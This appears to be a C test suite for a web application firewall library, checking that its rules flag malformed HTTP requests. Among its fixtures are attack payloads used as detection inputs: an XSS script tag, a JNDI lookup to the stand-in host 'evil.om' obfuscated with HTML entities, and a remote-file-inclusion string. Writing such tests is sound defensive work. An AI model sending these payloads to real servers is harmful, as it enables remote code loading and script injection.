#include <stdio.h>
#include <string.h>

#include "luminawaf.h"

static void set_request_metadata(LuminaBundle *bundle,
                                 const unsigned char *method,
                                 size_t method_len) {
    static const unsigned char request_line[] = "GET / HTTP/1.1";
    static const unsigned char protocol[] = "HTTP/1.1";
    static const unsigned char user_agent[] = "lumina-rc-sanity";

    bundle->req_method = method;
    bundle->req_method_len = method_len;
    bundle->req_line = request_line;
    bundle->req_line_len = sizeof(request_line) - 1;
    bundle->req_protocol = protocol;
    bundle->req_protocol_len = sizeof(protocol) - 1;
    bundle->user_agent = user_agent;
    bundle->user_agent_len = sizeof(user_agent) - 1;
    bundle->hdr_host_count = 1;
    bundle->hdr_user_agent_count = 1;
}

static int check_worker_lifecycle(void) {
    if (luminawaf_init_worker(1) != 0) return 0;
    if (luminawaf_init_worker(4096) != 0) return 0;
    luminawaf_destroy_worker();
    return luminawaf_init_worker(64) == 0;
}

static int check_one_byte_generated_rule(void) {
    static const unsigned char method[] = "GET";
    static const unsigned char invalid_header_value[] = {'\n'};
    LuminaBundle bundle;
    LuminaRuleState state;
    LuminaResult result;

    memset(&bundle, 0, sizeof(bundle));
    memset(&state, 0, sizeof(state));
    memset(&result, 0, sizeof(result));
    set_request_metadata(&bundle, method, sizeof(method) - 1);

    bundle.count = 1;
    bundle.vars[0].ptr = invalid_header_value;
    bundle.vars[0].len = sizeof(invalid_header_value);
    bundle.vars[0].var_type = LUMINA_VAR_HDR;
    bundle.vars[0].scope = LUMINA_SCOPE_HEADERS;
    bundle.vars[0].collection_mask = LUMINA_COL_REQUEST_HEADERS;

    if (luminawaf_inspect_bundle(&bundle, &state, &result) != 0) return 0;
    return result.threat_level == 921140 &&
           luminawaf_rule_state_matched(&state, 921140) == 1;
}

static int check_metadata_without_uri(void) {
    static const unsigned char method[] = "DELETE";
    static const unsigned char body[] = "plain body";
    LuminaBundle bundle;
    LuminaRuleState state;
    LuminaResult result;

    memset(&bundle, 0, sizeof(bundle));
    memset(&state, 0, sizeof(state));
    memset(&result, 0, sizeof(result));
    set_request_metadata(&bundle, method, sizeof(method) - 1);

    bundle.count = 1;
    bundle.vars[0].ptr = body;
    bundle.vars[0].len = sizeof(body) - 1;
    bundle.vars[0].var_type = LUMINA_VAR_BODY;
    bundle.vars[0].scope = LUMINA_SCOPE_BODY;
    bundle.vars[0].collection_mask = LUMINA_COL_REQUEST_BODY;

    if (luminawaf_inspect_bundle(&bundle, &state, &result) != 0) return 0;
    return result.threat_level == 911100 &&
           luminawaf_rule_state_matched(&state, 911100) == 1;
}

static int check_absolute_uri_requires_path(void) {
    static const unsigned char method[] = "GET";
    static const unsigned char invalid_line[] =
        "GET http://localhost HTTP/1.1";
    static const unsigned char valid_line[] =
        "GET http://localhost/ HTTP/1.1";
    static const unsigned char invalid_space_line[] =
        "GET /with embedded-space HTTP/1.1";
    static const unsigned char uri[] = "/";
    const unsigned char *lines[] = {
        invalid_line, valid_line, invalid_space_line};
    const size_t lengths[] = {
        sizeof(invalid_line) - 1,
        sizeof(valid_line) - 1,
        sizeof(invalid_space_line) - 1,
    };
    const int expected_matches[] = {1, 0, 1};

    for (size_t i = 0; i < 3; ++i) {
        LuminaBundle bundle;
        LuminaRuleState state;
        LuminaResult result;

        memset(&bundle, 0, sizeof(bundle));
        memset(&state, 0, sizeof(state));
        memset(&result, 0, sizeof(result));
        set_request_metadata(&bundle, method, sizeof(method) - 1);
        bundle.req_line = lines[i];
        bundle.req_line_len = lengths[i];
        bundle.count = 1;
        bundle.vars[0].ptr = uri;
        bundle.vars[0].len = sizeof(uri) - 1;
        bundle.vars[0].var_type = LUMINA_VAR_URI;
        bundle.vars[0].scope = LUMINA_SCOPE_URI;
        bundle.vars[0].collection_mask = LUMINA_COL_REQUEST_FILENAME;

        if (luminawaf_inspect_bundle(&bundle, &state, &result) != 0) return 0;
        if (luminawaf_rule_state_matched(&state, 920100) !=
            expected_matches[i]) {
            fprintf(stderr,
                    "absolute URI path[%zu]: threat=%d matched_920100=%d\n",
                    i, result.threat_level,
                    luminawaf_rule_state_matched(&state, 920100));
            return 0;
        }
    }
    return 1;
}

static int check_cookie_version_selector(void) {
    static const unsigned char method[] = "GET";
    static const unsigned char cookie_name[] = "Cookie";
    static const unsigned char positive[] =
        "$Version=1; session=deadbeef; PHPSESSID=secret";
    static const unsigned char negative[] =
        "MyVersion=1; PHPSESSID=secret";
    const unsigned char *cookies[] = {positive, negative};
    const size_t lengths[] = {
        sizeof(positive) - 1,
        sizeof(negative) - 1,
    };

    for (size_t i = 0; i < 2; ++i) {
        LuminaBundle bundle;
        LuminaRuleState state;
        LuminaResult result;

        memset(&bundle, 0, sizeof(bundle));
        memset(&state, 0, sizeof(state));
        memset(&result, 0, sizeof(result));
        set_request_metadata(&bundle, method, sizeof(method) - 1);
        bundle.count = 1;
        bundle.vars[0].ptr = cookies[i];
        bundle.vars[0].len = lengths[i];
        bundle.vars[0].var_type = LUMINA_VAR_COOKIE;
        bundle.vars[0].scope = LUMINA_SCOPE_HEADERS;
        bundle.vars[0].header_mask = LUMINA_HDR_COOKIE;
        bundle.vars[0].collection_mask =
            LUMINA_COL_REQUEST_COOKIES |
            LUMINA_COL_REQUEST_COOKIES_NAMES;
        bundle.vars[0].name = cookie_name;
        bundle.vars[0].name_len = sizeof(cookie_name) - 1;

        if (luminawaf_inspect_bundle(&bundle, &state, &result) != 0) return 0;
        if (luminawaf_rule_state_matched(&state, 921250) != (i == 0)) {
            fprintf(stderr,
                    "cookie selector[%zu]: threat=%d matched_921250=%d\n",
                    i, result.threat_level,
                    luminawaf_rule_state_matched(&state, 921250));
            return 0;
        }
    }
    return 1;
}

static int check_bundle_count_bounds(void) {
    static const unsigned char value[] = "x";
    LuminaBundle bundle;
    LuminaRuleState state;
    LuminaResult result;

    memset(&bundle, 0, sizeof(bundle));
    memset(&state, 0, sizeof(state));
    memset(&result, 0, sizeof(result));
    bundle.vars[0].ptr = value;
    bundle.vars[0].len = sizeof(value) - 1;
    bundle.count = LUMINA_BUNDLE_MAX_VARS + 1;

    if (luminawaf_inspect_bundle(&bundle, &state, &result) != -1) return 0;
    bundle.count = -1;
    return luminawaf_inspect_bundle(&bundle, &state, &result) == -1;
}

static int check_bundle_value_bounds(void) {
    static const unsigned char value[] = "x";
    LuminaBundle bundle;
    LuminaRuleState state;
    LuminaResult result;

    memset(&bundle, 0, sizeof(bundle));
    memset(&state, 0, sizeof(state));
    memset(&result, 0, sizeof(result));
    bundle.vars[0].ptr = value;
    bundle.vars[0].len = LUMINA_MAX_INSPECTED_VALUE + 1;
    bundle.vars[0].var_type = LUMINA_VAR_BODY;
    bundle.vars[0].scope = LUMINA_SCOPE_BODY;
    bundle.vars[0].collection_mask = LUMINA_COL_REQUEST_BODY;
    bundle.count = 1;

    if (luminawaf_inspect_bundle(&bundle, &state, &result) != -1) return 0;

    bundle.vars[0].ptr = NULL;
    bundle.vars[0].len = 1;
    return luminawaf_inspect_bundle(&bundle, &state, &result) == -1;
}

static int check_multipart_field_projection(void) {
    static const unsigned char method[] = "GET";
    static const unsigned char content_type[] =
        "multipart/form-data; boundary=lumina-boundary";
    static const unsigned char content_type_name[] = "Content-Type";
    static const unsigned char body[] =
        "--lumina-boundary\r\n"
        "Content-Disposition: form-data; name=\"payload\"\r\n"
        "\r\n"
        "<script>alert(1)</script>\r\n"
        "--lumina-boundary--\r\n";
    LuminaBundle bundle;
    LuminaRuleState state;
    LuminaResult result;

    memset(&bundle, 0, sizeof(bundle));
    memset(&state, 0, sizeof(state));
    memset(&result, 0, sizeof(result));
    set_request_metadata(&bundle, method, sizeof(method) - 1);

    bundle.count = 2;
    bundle.vars[0].ptr = content_type;
    bundle.vars[0].len = sizeof(content_type) - 1;
    bundle.vars[0].var_type = LUMINA_VAR_HDR;
    bundle.vars[0].scope = LUMINA_SCOPE_HEADERS;
    bundle.vars[0].header_mask = LUMINA_HDR_CONTENT_TYPE;
    bundle.vars[0].collection_mask = LUMINA_COL_REQUEST_HEADERS;
    bundle.vars[0].name = content_type_name;
    bundle.vars[0].name_len = sizeof(content_type_name) - 1;
    bundle.vars[1].ptr = body;
    bundle.vars[1].len = sizeof(body) - 1;
    bundle.vars[1].var_type = LUMINA_VAR_BODY;
    bundle.vars[1].scope = LUMINA_SCOPE_BODY;
    bundle.vars[1].collection_mask = LUMINA_COL_REQUEST_BODY;
    bundle.hdr_content_type_count = 1;
    bundle.hdr_presence_mask = LUMINA_HDR_CONTENT_TYPE;

    int status = luminawaf_inspect_bundle(&bundle, &state, &result);
    int matched = luminawaf_rule_state_matched(&state, 941390);
    if (status != 0 || result.threat_level != 941390 || matched != 1) {
        fprintf(
            stderr,
            "multipart projection: status=%d threat=%d matched_941390=%d\n",
            status, result.threat_level, matched);
        return 0;
    }
    return 1;
}

static int check_multipart_transfer_encoding_rule(void) {
    static const unsigned char method[] = "POST";
    static const unsigned char content_type[] =
        "multipart/form-data; boundary=lumina-boundary";
    static const unsigned char content_type_name[] = "Content-Type";
    static const unsigned char body[] =
        "--lumina-boundary\r\n"
        "Content-Disposition: form-data; name=\"payload\"\r\n"
        "Content-Transfer-Encoding: 8bit\r\n"
        "Content-Type: text/plain\r\n"
        "\r\n"
        "Pineapple. Pizza.\r\n"
        "--lumina-boundary--\r\n";
    LuminaBundle bundle;
    LuminaRuleState state;
    LuminaResult result;

    memset(&bundle, 0, sizeof(bundle));
    memset(&state, 0, sizeof(state));
    memset(&result, 0, sizeof(result));
    set_request_metadata(&bundle, method, sizeof(method) - 1);
    bundle.count = 2;
    bundle.vars[0].ptr = content_type;
    bundle.vars[0].len = sizeof(content_type) - 1;
    bundle.vars[0].var_type = LUMINA_VAR_HDR;
    bundle.vars[0].scope = LUMINA_SCOPE_HEADERS;
    bundle.vars[0].header_mask = LUMINA_HDR_CONTENT_TYPE;
    bundle.vars[0].collection_mask = LUMINA_COL_REQUEST_HEADERS;
    bundle.vars[0].name = content_type_name;
    bundle.vars[0].name_len = sizeof(content_type_name) - 1;
    bundle.vars[1].ptr = body;
    bundle.vars[1].len = sizeof(body) - 1;
    bundle.vars[1].var_type = LUMINA_VAR_BODY;
    bundle.vars[1].scope = LUMINA_SCOPE_BODY | LUMINA_SCOPE_MULTIPART;
    bundle.vars[1].collection_mask = LUMINA_COL_REQUEST_BODY;
    bundle.hdr_content_type_count = 1;
    bundle.hdr_presence_mask = LUMINA_HDR_CONTENT_TYPE;

    if (luminawaf_inspect_bundle(&bundle, &state, &result) != 0) return 0;
    if (!luminawaf_rule_state_matched(&state, 922120)) {
        fprintf(stderr,
                "multipart CTE: threat=%d matched_922120=0 flags=0x%llx\n",
                result.threat_level,
                (unsigned long long)state.transaction_flags);
        return 0;
    }
    return 1;
}

static int check_protocol_collection_rules(void) {
    static const unsigned char method[] = "GET";
    static const unsigned char invalid_content_length[] = "12x";
    static const unsigned char valid_content_length[] = "12";
    static const unsigned char raw_fragment_uri[] = "/path#fragment";
    const int rule_ids[] = {920160, 920181, 920610, 920620};

    for (size_t i = 0; i < sizeof(rule_ids) / sizeof(rule_ids[0]); ++i) {
        LuminaBundle bundle;
        LuminaRuleState state;
        LuminaResult result;

        memset(&bundle, 0, sizeof(bundle));
        memset(&state, 0, sizeof(state));
        memset(&result, 0, sizeof(result));
        set_request_metadata(&bundle, method, sizeof(method) - 1);
        bundle.count = 1;

        if (rule_ids[i] == 920160 || rule_ids[i] == 920181) {
            bundle.vars[0].ptr = rule_ids[i] == 920160
                                     ? invalid_content_length
                                     : valid_content_length;
            bundle.vars[0].len = rule_ids[i] == 920160
                                     ? sizeof(invalid_content_length) - 1
                                     : sizeof(valid_content_length) - 1;
            bundle.vars[0].var_type = LUMINA_VAR_HDR;
            bundle.vars[0].scope = LUMINA_SCOPE_HEADERS;
            bundle.vars[0].header_mask = LUMINA_HDR_CONTENT_LENGTH;
            bundle.vars[0].collection_mask = LUMINA_COL_REQUEST_HEADERS;
            bundle.hdr_presence_mask = LUMINA_HDR_CONTENT_LENGTH;
            if (rule_ids[i] == 920181) {
                bundle.hdr_transfer_encoding_count = 1;
            }
        } else {
            bundle.vars[0].ptr = raw_fragment_uri;
            bundle.vars[0].len = rule_ids[i] == 920610
                                     ? sizeof(raw_fragment_uri) - 1
                                     : 1;
            bundle.vars[0].var_type = LUMINA_VAR_URI;
            bundle.vars[0].scope = LUMINA_SCOPE_URI;
            bundle.vars[0].collection_mask = LUMINA_COL_REQUEST_FILENAME;
            if (rule_ids[i] == 920620) {
                bundle.hdr_content_type_count = 2;
            }
        }

        if (luminawaf_inspect_bundle(&bundle, &state, &result) != 0 ||
            !luminawaf_rule_state_matched(&state, rule_ids[i])) {
            fprintf(stderr,
                    "protocol collection rule %d: threat=%d matched=0\n",
                    rule_ids[i], result.threat_level);
            return 0;
        }
    }
    return 1;
}

static int check_multipart_invalid_header_name_rule(void) {
    static const unsigned char method[] = "POST";
    static const unsigned char content_type[] =
        "multipart/form-data; boundary=lumina-boundary";
    static const unsigned char content_type_name[] = "Content-Type";
    static const unsigned char body[] =
        "--lumina-boundary\r\n"
        "Bad\tName: value\r\n"
        "\r\n"
        "clean value\r\n"
        "--lumina-boundary--\r\n";
    LuminaBundle bundle;
    LuminaRuleState state;
    LuminaResult result;

    memset(&bundle, 0, sizeof(bundle));
    memset(&state, 0, sizeof(state));
    memset(&result, 0, sizeof(result));
    set_request_metadata(&bundle, method, sizeof(method) - 1);

    bundle.count = 2;
    bundle.vars[0].ptr = content_type;
    bundle.vars[0].len = sizeof(content_type) - 1;
    bundle.vars[0].name = content_type_name;
    bundle.vars[0].name_len = sizeof(content_type_name) - 1;
    bundle.vars[0].var_type = LUMINA_VAR_HDR;
    bundle.vars[0].scope = LUMINA_SCOPE_HEADERS;
    bundle.vars[0].header_mask = LUMINA_HDR_CONTENT_TYPE;
    bundle.vars[0].collection_mask = LUMINA_COL_REQUEST_HEADERS;
    bundle.vars[1].ptr = body;
    bundle.vars[1].len = sizeof(body) - 1;
    bundle.vars[1].var_type = LUMINA_VAR_BODY;
    bundle.vars[1].scope = LUMINA_SCOPE_BODY | LUMINA_SCOPE_MULTIPART;
    bundle.vars[1].collection_mask = LUMINA_COL_REQUEST_BODY;
    bundle.hdr_content_type_count = 1;
    bundle.hdr_presence_mask = LUMINA_HDR_CONTENT_TYPE;

    if (luminawaf_inspect_bundle(&bundle, &state, &result) != 0 ||
        !luminawaf_rule_state_matched(&state, 922130)) {
        fprintf(stderr,
                "multipart invalid header: threat=%d matched_922130=%d "
                "flags=0x%llx\n",
                result.threat_level,
                luminawaf_rule_state_matched(&state, 922130),
                (unsigned long long)state.transaction_flags);
        return 0;
    }
    return 1;
}

static int check_long_numeric_html_entity(void) {
    static const unsigned char method[] = "GET";
    static const unsigned char user_agent_name[] = "User-Agent";
    static const unsigned char payload[] =
        "&#x24;&#00000000000000000000000000000000000000000000000123;"
        "jndi:ldap://evil.om/w}";
    LuminaBundle bundle;
    LuminaRuleState state;
    LuminaResult result;

    memset(&bundle, 0, sizeof(bundle));
    memset(&state, 0, sizeof(state));
    memset(&result, 0, sizeof(result));
    set_request_metadata(&bundle, method, sizeof(method) - 1);
    bundle.user_agent = payload;
    bundle.user_agent_len = sizeof(payload) - 1;
    bundle.count = 1;
    bundle.vars[0].ptr = payload;
    bundle.vars[0].len = sizeof(payload) - 1;
    bundle.vars[0].var_type = LUMINA_VAR_HDR;
    bundle.vars[0].scope = LUMINA_SCOPE_HEADERS;
    bundle.vars[0].header_mask = LUMINA_HDR_USER_AGENT;
    bundle.vars[0].collection_mask = LUMINA_COL_REQUEST_HEADERS;
    bundle.vars[0].name = user_agent_name;
    bundle.vars[0].name_len = sizeof(user_agent_name) - 1;

    if (luminawaf_inspect_bundle(&bundle, &state, &result) != 0) return 0;
    if (luminawaf_audit_bundle_rule(&bundle, &state, 944150) != 1 ||
        luminawaf_audit_bundle_rule(&bundle, &state, 944151) != 1) {
        return 0;
    }
    if (!luminawaf_rule_state_matched(&state, 944150) ||
        !luminawaf_rule_state_matched(&state, 944151)) {
        fprintf(stderr,
                "long HTML entity: threat=%d matched_944150=%d "
                "matched_944151=%d\n",
                result.threat_level,
                luminawaf_rule_state_matched(&state, 944150),
                luminawaf_rule_state_matched(&state, 944151));
        return 0;
    }
    return 1;
}

static int check_json_raw_request_body_collection(void) {
    static const unsigned char method[] = "POST";
    static const unsigned char processor[] = "JSON";
    static const unsigned char body[] =
        "{\"payload\":\"appserv_root=http://raw-body.example\"}";
    LuminaBundle bundle;
    LuminaRuleState state;
    LuminaResult result;

    memset(&bundle, 0, sizeof(bundle));
    memset(&state, 0, sizeof(state));
    memset(&result, 0, sizeof(result));
    set_request_metadata(&bundle, method, sizeof(method) - 1);

    bundle.count = 1;
    bundle.vars[0].ptr = body;
    bundle.vars[0].len = sizeof(body) - 1;
    bundle.vars[0].var_type = LUMINA_VAR_BODY;
    bundle.vars[0].scope = LUMINA_SCOPE_BODY | LUMINA_SCOPE_JSON;
    bundle.vars[0].collection_mask =
        LUMINA_COL_REQUEST_BODY | LUMINA_COL_JSON;
    bundle.reqbody_processor = processor;
    bundle.reqbody_processor_len = sizeof(processor) - 1;

    int status = luminawaf_inspect_bundle(&bundle, &state, &result);
    int matched = luminawaf_rule_state_matched(&state, 931110);
    if (status != 0 || matched != 1) {
        fprintf(stderr,
                "raw REQUEST_BODY sentinel: status=%d threat=%d matched=%d\n",
                status, result.threat_level, matched);
        return 0;
    }
    return 1;
}

static int check_long_json_raw_body_sentinels(void) {
    static const unsigned char method[] = "POST";
    static const unsigned char processor[] = "JSON";
    static const unsigned char sentinel[] =
        "appserv_root=http://raw-body.example";
    static unsigned char body[LUMINA_MAX_INSPECTED_VALUE];
    static const size_t offsets[] = {
        128,
        LUMINA_MAX_INSPECTED_VALUE / 2,
        LUMINA_MAX_INSPECTED_VALUE - sizeof(sentinel) - 2,
    };

    for (size_t i = 0; i < sizeof(offsets) / sizeof(offsets[0]); ++i) {
        LuminaBundle bundle;
        LuminaRuleState state;
        LuminaResult result;

        memset(body, 'a', sizeof(body));
        body[0] = '"';
        body[sizeof(body) - 1] = '"';
        memcpy(body + offsets[i], sentinel, sizeof(sentinel) - 1);

        memset(&bundle, 0, sizeof(bundle));
        memset(&state, 0, sizeof(state));
        memset(&result, 0, sizeof(result));
        set_request_metadata(&bundle, method, sizeof(method) - 1);

        bundle.count = 1;
        bundle.vars[0].ptr = body;
        bundle.vars[0].len = sizeof(body);
        bundle.vars[0].var_type = LUMINA_VAR_BODY;
        bundle.vars[0].scope = LUMINA_SCOPE_BODY | LUMINA_SCOPE_JSON;
        bundle.vars[0].collection_mask =
            LUMINA_COL_REQUEST_BODY | LUMINA_COL_JSON;
        bundle.reqbody_processor = processor;
        bundle.reqbody_processor_len = sizeof(processor) - 1;

        int status = luminawaf_inspect_bundle(&bundle, &state, &result);
        int matched = luminawaf_rule_state_matched(&state, 931110);
        if (status != 0 || matched != 1) {
            fprintf(stderr,
                    "long REQUEST_BODY sentinel[%zu]: offset=%zu status=%d "
                    "threat=%d matched=%d\n",
                    i, offsets[i], status, result.threat_level, matched);
            return 0;
        }
    }
    return 1;
}

int main(void) {
    int passed = 0;

#define RUN_CHECK(check) \
    do { \
        int ok = check(); \
        if (!ok) fprintf(stderr, "FAILED: %s\n", #check); \
        passed += ok; \
    } while (0)

    RUN_CHECK(check_worker_lifecycle);
    RUN_CHECK(check_one_byte_generated_rule);
    RUN_CHECK(check_metadata_without_uri);
    RUN_CHECK(check_absolute_uri_requires_path);
    RUN_CHECK(check_cookie_version_selector);
    RUN_CHECK(check_bundle_count_bounds);
    RUN_CHECK(check_bundle_value_bounds);
    RUN_CHECK(check_multipart_field_projection);
    RUN_CHECK(check_multipart_transfer_encoding_rule);
    RUN_CHECK(check_protocol_collection_rules);
    RUN_CHECK(check_multipart_invalid_header_name_rule);
    RUN_CHECK(check_long_numeric_html_entity);
    RUN_CHECK(check_json_raw_request_body_collection);
    RUN_CHECK(check_long_json_raw_body_sentinels);

#undef RUN_CHECK

    printf("RC runtime sanity: %d/14 passed\n", passed);
    luminawaf_destroy_worker();
    return passed == 14 ? 0 : 1;
}
